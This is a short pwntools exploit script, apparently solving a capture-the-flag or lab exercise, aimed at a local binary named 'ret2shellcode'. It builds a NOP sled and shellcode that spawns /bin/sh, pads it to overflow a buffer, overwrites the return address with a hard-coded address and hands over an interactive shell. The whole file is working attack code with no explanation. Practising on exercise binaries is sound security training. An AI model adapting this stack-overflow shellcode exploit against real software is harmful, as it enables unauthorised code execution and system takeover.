from pwn import *
context.arch="i386"
p = process("./ret2shellcode")
# buf @ 0xffffd40c
input()
payload = b"\x90\x90\x90\x90"
payload += asm(shellcraft.sh())
payload = payload.ljust(0x64+3*4, b"a")
p.sendline(payload + 2*p32(0x0804A080))
p.interactive()